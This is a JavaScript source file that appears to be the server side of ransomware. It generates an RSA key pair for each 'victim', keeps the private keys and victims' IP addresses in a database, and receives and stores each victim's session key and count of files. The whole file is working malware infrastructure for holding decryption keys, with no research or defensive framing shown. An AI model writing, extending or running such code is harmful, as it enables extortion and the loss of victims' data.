import { randomUUID, generateKeyPairSync } from 'crypto';
import db from '../config/db.js';

// Helper function (Used by AuthController too)
export const createVictimIdentity = (ip) => {
    const clientId = randomUUID();
    console.log(`[Backend] Generating keys for: ${clientId}`);
    
    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    db.run(
        `INSERT OR IGNORE INTO victims (client_id, created_at, ip, private_key, public_key) VALUES (?, ?, ?, ?, ?)`,
        [clientId, new Date().toISOString(), ip, privateKey, publicKey]
    );
    return { clientId, publicKey, privateKey };
};

// --- Controllers ---

export const newVictim = (req, res) => {
    // Legacy endpoint (if needed without login)
    const identity = createVictimIdentity(req.ip);
    res.status(201).json({ clientId: identity.clientId, publicKey: identity.publicKey });
};

export const reportSessionKey = (req, res) => {
    const { key, clientId, filesCount } = req.body;
    
    if (!key || !clientId) return res.status(400).json({ error: 'Missing data' });

    db.run(
        `INSERT INTO session_keys (client_id, key, files_count, received_at, ip) VALUES (?, ?, ?, ?, ?)`,
        [clientId, key, filesCount || 0, new Date().toISOString(), req.ip],
        (err) => {
            if (err) {
                console.error(err);
                return res.status(500).json({error: "DB Error"});
            }
            console.log(`[Backend] Key received for ${clientId}`);
            res.status(201).json({ stored: true });
        }
    );
};